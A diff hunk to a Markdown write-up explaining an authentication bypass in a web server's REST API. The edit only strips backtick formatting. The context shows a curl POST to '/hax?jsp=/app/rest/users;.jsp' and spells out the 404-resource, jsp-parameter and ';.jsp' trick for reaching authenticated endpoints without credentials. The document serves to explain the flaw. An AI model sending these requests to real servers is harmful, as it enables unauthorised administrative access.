@@ -147,13 +147,13 @@ curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/users;.jsp -X POST -H "Cont
 What is happening here?
 > To leverage this vulnerability to successfully call the authenticated endpoint `/app/rest/server`, an unauthenticated attacker must satisfy the following three requirements during an HTTP(S) request:
 >- Request an unauthenticated resource that generates a 404 response. This can be achieved by requesting a non existent resource, e.g.:
-    `/hax`
+    /hax
 >- Pass an HTTP query parameter named jsp containing the value of an authenticated URI path. This can be achieved by appending an HTTP query string, e.g.:
-     `?jsp=/app/rest/server`
+     ?jsp=/app/rest/server
 >- Ensure the arbitrary URI path ends with .jsp. This can be achieved by appending an HTTP path parameter segment, e.g.:
-     `;.jsp`
+     ;.jsp
 Combining the above requirements, the attacker’s URI path becomes:
-	`/hax?jsp=/app/rest/server;.jsp`
+	/hax?jsp=/app/rest/server;.jsp
 By using the authentication bypass vulnerability, we can successfully call this authenticated endpoint with no authentication.
 >
 > ```
